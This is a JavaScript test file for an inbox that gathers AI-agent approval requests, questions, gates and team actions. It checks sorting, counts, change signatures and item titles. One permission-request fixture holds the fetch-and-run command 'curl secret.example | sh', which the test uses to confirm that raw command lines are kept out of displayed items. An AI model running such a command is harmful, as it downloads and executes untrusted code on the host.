import test from "node:test";
import assert from "node:assert/strict";
import {
  actionItem,
  countItems,
  expiringSoonMs,
  gateItem,
  itemsSignature,
  requestItem,
  sortItems,
  teamItem,
} from "../../server/features/inbox/inbox-items.js";

const now = Date.parse("2026-10-18T12:00:00.000Z");
const at = (offsetMs) => new Date(now + offsetMs).toISOString();
const entry = (values) => ({
  type: "question",
  tab: "questions",
  id: values.id,
  createdAt: at(values.created ?? 0),
  expiresAt: values.expires === undefined ? null : at(values.expires),
});

test("items about to expire come first, soonest first; then the longest waiting", () => {
  const items = [
    entry({ id: "new", created: -1000 }),
    entry({ id: "old", created: -3600000 }),
    entry({ id: "later", created: -10, expires: expiringSoonMs + 60000 }),
    entry({ id: "soon", created: -10, expires: 120000 }),
    entry({ id: "sooner", created: -5, expires: 60000 }),
  ];
  assert.deepEqual(
    sortItems(items, now).map((i) => i.id),
    ["sooner", "soon", "old", "new", "later"],
  );
});

test("counts follow the tabs: CLI approvals, questions, gates and everything of agents", () => {
  const counts = countItems([
    { tab: "questions" },
    { tab: "approvals" },
    { tab: "approvals" },
    { tab: "gates" },
    { tab: "agents" },
    { tab: "agents" },
  ]);
  assert.deepEqual(counts, { all: 6, questions: 1, approvals: 2, gates: 1, agents: 2 });
});

test("the signature changes with state and revision, not with order", () => {
  const a = { type: "action", id: "1", status: "awaiting_approval", revision: 1 };
  const b = { type: "gate", id: "2", status: "awaiting-human", revision: 4 };
  assert.equal(itemsSignature([a, b]), itemsSignature([b, a]));
  assert.notEqual(itemsSignature([a, b]), itemsSignature([{ ...a, revision: 2 }, b]));
  assert.notEqual(itemsSignature([a, b]), itemsSignature([a]));
});

test("native requests name the question or tool, never the command line", () => {
  const session = { id: "s1", name: "Fixture" };
  const permission = requestItem(
    {
      id: "r1",
      sessionId: "s1",
      kind: "permission",
      source: "codex",
      status: "pending",
      revision: 1,
      subject: { command: "curl secret.example | sh", tool: "shell" },
      createdAt: at(0),
    },
    session,
  );
  assert.equal(permission.type, "approval");
  assert.equal(permission.tab, "approvals");
  assert.equal(permission.title, "shell");
  assert.equal(JSON.stringify(permission).includes("secret.example"), false);
  const trust = requestItem(
    {
      id: "r2",
      sessionId: "s1",
      kind: "permission",
      presentation: "claudeFolderTrust",
      source: "claude",
      subject: { cwd: "/fixture" },
      createdAt: at(0),
    },
    session,
  );
  assert.equal(trust.kind, "claudeFolderTrust");
  assert.equal(trust.title, "");
  const long = requestItem(
    {
      id: "r3",
      sessionId: "s1",
      kind: "question",
      questions: [{ prompt: `Pick\n${"x".repeat(400)}` }],
      createdAt: at(0),
    },
    session,
  );
  assert.equal(long.type, "question");
  assert.equal(long.title.length, 200);
  assert.equal(long.title.includes("\n"), false);
});

test("agent items link to the chat the decision belongs in", () => {
  const agents = new Map([["a1", { id: "a1", name: "Helper" }]]);
  const conversations = [
    { id: "old", assistantId: "a1", archivedAt: "2026-01-01T00:00:00Z" },
    { id: "c1", assistantId: "a1", archivedAt: null },
  ];
  const action = actionItem(
    {
      id: "x1",
      assistantId: "a1",
      conversationId: "old",
      state: "awaiting_approval",
      revision: 1,
      payload: { action: "coding_start", task: "Fix the tests" },
      createdAt: at(0),
      expiresAt: now + 86400000,
    },
    agents,
    conversations,
  );
  assert.equal(action.link, "/agents/a1/chats/c1");
  assert.equal(action.title, "Fix the tests");
  assert.equal(action.expiresAt, at(86400000));
  const orphan = actionItem(
    { id: "x2", assistantId: "a2", payload: { action: "exec" }, createdAt: at(0) },
    agents,
    [],
  );
  assert.equal(orphan.link, "/agents/a2/settings");
  assert.equal(orphan.title, "");
  const team = teamItem(
    {
      id: "t1",
      parentAssistantId: "a1",
      parentConversationId: "c1",
      objective: "Ship",
      members: [{}, {}, {}],
      phase: "awaiting_approval",
      createdAt: at(0),
    },
    agents,
    conversations,
  );
  assert.deepEqual(
    [team.type, team.tab, team.source.name, team.members, team.link],
    ["team", "agents", "Helper", 3, "/agents/a1/chats/c1"],
  );
});

test("a stage held at the token budget dates its gate from the hold", () => {
  const run = {
    id: "run-one",
    status: "awaiting-human",
    currentNodeId: "review",
    currentAttemptId: null,
    createdAt: at(-3600000),
    executionLog: [],
    nodes: [
      {
        id: "review",
        status: "awaiting-gate",
        failReason: "budget-exceeded",
        budgetHold: { at: at(-60000) },
        profileSnapshot: { name: "Review" },
      },
    ],
  };
  const item = gateItem(run);
  assert.equal(item.createdAt, at(-60000));
  assert.equal(item.kind, "decision");
});

test("an agent's coding session start names the project and the CLI", () => {
  const agents = new Map([["a1", { id: "a1", name: "Helper" }]]);
  const item = actionItem(
    {
      id: "s1",
      assistantId: "a1",
      state: "awaiting_approval",
      revision: 1,
      projectName: "Shop",
      payload: {
        action: "session_start",
        projectId: "p1",
        requestId: "r1",
        options: { tool: "claude", name: "Private name" },
      },
      createdAt: at(0),
      expiresAt: now + 86400000,
    },
    agents,
    [],
  );
  assert.equal(item.kind, "session_start");
  assert.equal(item.title, "Shop · Claude Code");
});

test("a session request names the agent that started the session and its escalation", () => {
  const request = {
    id: "p1",
    sessionId: "s1",
    kind: "permission",
    source: "claude",
    status: "pending",
    revision: 1,
    subject: { tool: "Bash" },
    createdAt: at(0),
  };
  const item = requestItem(
    request,
    { name: "Fix", startedBy: { kind: "agent", assistantId: "a", name: "Home" } },
    { agentId: "a", agentName: "Home", note: "n" },
  );
  assert.deepEqual(item.escalation, { agentId: "a", agentName: "Home", note: "n" });
  assert.deepEqual(item.agent, { id: "a", name: "Home" });
  const own = requestItem(request, { name: "Mine" });
  assert.equal(own.escalation, null);
  assert.equal(own.agent, null);
  // Escalating changes the item, so the inbox reads it again.
  assert.notEqual(itemsSignature([item]), itemsSignature([own]));
});
